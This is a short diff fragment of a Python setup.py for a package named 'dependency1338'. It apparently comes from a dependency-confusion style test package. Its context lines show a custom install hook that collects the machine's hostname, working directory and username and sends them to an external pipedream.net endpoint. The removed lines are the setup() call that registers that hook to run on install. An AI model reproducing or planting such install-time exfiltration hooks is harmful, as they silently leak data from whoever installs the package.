@@ -225,12 +225,3 @@ class CustomInstall(install):
         username = getpass.getuser()
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
         requests.get("https://eo6ksiuyau5e5x2.m.pipedream.net",params = ploads)
-
-
-setup(name='dependency1338',
-      version='1.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
